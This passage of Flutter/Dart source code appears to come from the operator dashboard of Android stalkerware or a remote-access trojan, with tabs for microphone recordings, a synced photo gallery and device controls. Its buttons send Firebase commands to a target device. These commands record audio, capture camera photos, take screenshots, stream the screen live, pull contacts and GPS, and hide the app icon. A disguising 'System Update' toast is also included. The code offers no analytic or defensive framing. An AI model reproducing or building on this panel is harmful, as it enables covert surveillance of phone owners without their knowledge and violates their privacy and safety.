  Widget build(BuildContext context) => Column(children: [
    Padding(padding: const EdgeInsets.all(12), child: Row(children: [
      Expanded(child: ElevatedButton(onPressed: () => widget.onCommand('record_mic', {'duration': 30}), style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF6C63FF), padding: const EdgeInsets.symmetric(vertical: 12), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))), child: Text('🎤 Record 30s', style: GoogleFonts.inter(color: Colors.white, fontSize: 13)))),
      const SizedBox(width: 10),
      Expanded(child: ElevatedButton(onPressed: () => widget.onCommand('record_mic', {'duration': 60}), style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF8b5cf6), padding: const EdgeInsets.symmetric(vertical: 12), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))), child: Text('🎤 Record 60s', style: GoogleFonts.inter(color: Colors.white, fontSize: 13)))),
    ])),
    Expanded(child: _recordings.isEmpty ? Center(child: Text('No recordings yet', style: GoogleFonts.inter(color: Colors.white24))) : ListView.builder(
      padding: const EdgeInsets.all(12), itemCount: _recordings.length,
      itemBuilder: (_, i) {
        final r = _recordings[i];
        return Container(margin: const EdgeInsets.only(bottom: 8), padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(color: Colors.white.withOpacity(.04), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(.06))),
          child: Row(children: [
            const Icon(Icons.audio_file, color: Color(0xFF6C63FF), size: 28),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(r['filename'] ?? 'recording.aac', style: GoogleFonts.inter(fontSize: 13, fontWeight: FontWeight.w600, color: Colors.white)),
              Text('${r['duration'] ?? 0}s • ${r['size'] ?? 0} bytes', style: GoogleFonts.inter(fontSize: 12, color: Colors.white38)),
            ])),
            if (r['url'] != null) IconButton(icon: const Icon(Icons.play_circle, color: Color(0xFF6C63FF)), onPressed: () {}),
          ]));
      })),
  ]);
}

// ══════════════════════════════════════════════════════════════════════════════
// GALLERY TAB
// ══════════════════════════════════════════════════════════════════════════════
class GalleryTab extends StatefulWidget {
  final String deviceId;
  final void Function(String, [Map<String, dynamic>?]) onCommand;
  const GalleryTab({super.key, required this.deviceId, required this.onCommand});
  @override State<GalleryTab> createState() => _GalleryTabState();
}

class _GalleryTabState extends State<GalleryTab> {
  List<String> _images = [];
  @override
  void initState() { super.initState(); _listen(); }
  void _listen() {
    FirebaseDatabase.instance.ref('devices/${widget.deviceId}/gallery').limitToLast(50).onValue.listen((e) {
      if (e.snapshot.exists && mounted) {
        setState(() { _images = e.snapshot.children.map((c) => (c.value as Map)['url']?.toString() ?? '').where((u) => u.isNotEmpty).toList().reversed.toList(); });
      }
    });
  }
  @override
  Widget build(BuildContext context) => Column(children: [
    Padding(padding: const EdgeInsets.all(12), child: SizedBox(width: double.infinity, child: ElevatedButton(onPressed: () => widget.onCommand('sync_gallery'), style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF6C63FF), padding: const EdgeInsets.symmetric(vertical: 12), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))), child: Text('🖼 Sync Gallery Now', style: GoogleFonts.inter(color: Colors.white, fontSize: 13))))),
    Expanded(child: _images.isEmpty ? Center(child: Text('No gallery images yet\nTap Sync to fetch', textAlign: TextAlign.center, style: GoogleFonts.inter(color: Colors.white24))) : GridView.builder(
      padding: const EdgeInsets.all(12),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 6, mainAxisSpacing: 6),
      itemCount: _images.length,
      itemBuilder: (ctx, i) => GestureDetector(onTap: () => Navigator.push(ctx, MaterialPageRoute(builder: (_) => Scaffold(backgroundColor: Colors.black, appBar: AppBar(backgroundColor: Colors.black, leading: const BackButton(color: Colors.white)), body: PhotoView(imageProvider: NetworkImage(_images[i]))))), child: ClipRRect(borderRadius: BorderRadius.circular(8), child: CachedNetworkImage(imageUrl: _images[i], fit: BoxFit.cover))),
    )),
  ]);
}

// ══════════════════════════════════════════════════════════════════════════════
// CONTROLS TAB
// ══════════════════════════════════════════════════════════════════════════════
class ControlsTab extends StatelessWidget {
  final String deviceId;
  final void Function(String, [Map<String, dynamic>?]) onCommand;
  const ControlsTab({super.key, required this.deviceId, required this.onCommand});

  @override
  Widget build(BuildContext context) {
    return ListView(padding: const EdgeInsets.all(16), children: [
      _section('📸 Camera'),
      _grid([
        _ctrl('Front Camera', Icons.camera_front, () => onCommand('capture', {'camera': 'front'})),
        _ctrl('Back Camera', Icons.camera_rear, () => onCommand('capture', {'camera': 'back'})),
      ]),
      _section('🎤 Audio'),
      _grid([
        _ctrl('Record 30s', Icons.mic, () => onCommand('record_mic', {'duration': 30})),
        _ctrl('Record 60s', Icons.mic_external_on, () => onCommand('record_mic', {'duration': 60})),
      ]),
      _section('📷 Screen'),
      _grid([
        _ctrl('Screenshot', Icons.screenshot, () => onCommand('take_screenshot')),
        _ctrl('Live Screen', Icons.screen_share, () => onCommand('start_screen_stream')),
      ]),
      _section('📁 Data'),
      _grid([
        _ctrl('Sync Gallery', Icons.photo_library, () => onCommand('sync_gallery')),
        _ctrl('Get Contacts', Icons.contacts, () => onCommand('get_contacts')),
        _ctrl('Refresh GPS', Icons.gps_fixed, () => onCommand('refresh_location')),
        _ctrl('Get Battery', Icons.battery_full, () => onCommand('get_battery')),
      ]),
      _section('⚙️ Device'),
      _grid([
        _ctrl('Hide Icon', Icons.visibility_off, () => onCommand('hide_icon')),
        _ctrl('Show Toast', Icons.notifications, () => onCommand('show_toast', {'msg': 'System Update'})),
      ]),
    ]);
  }

  Widget _section(String title) => Padding(padding: const EdgeInsets.only(bottom: 12, top: 8), child: Text(title, style: GoogleFonts.inter(fontSize: 14, fontWeight: FontWeight.w600, color: Colors.white60)));

  Widget _grid(List<Widget> items) => Padding(padding: const EdgeInsets.only(bottom: 16), child: Wrap(spacing: 10, runSpacing: 10, children: items));

  Widget _ctrl(String label, IconData icon, VoidCallback onTap) => GestureDetector(
    onTap: onTap,
    child: Container(width: 150, padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: Colors.white.withOpacity(.04), borderRadius: BorderRadius.circular(14), border: Border.all(color: const Color(0xFF6C63FF).withOpacity(.3))),
      child: Column(mainAxisSize: MainAxisSize.min, children: [
        Icon(icon, color: const Color(0xFF6C63FF), size: 28),
        const SizedBox(height: 8),
        Text(label, textAlign: TextAlign.center, style: GoogleFonts.inter(fontSize: 12, color: Colors.white70)),
      ])),
  );
}
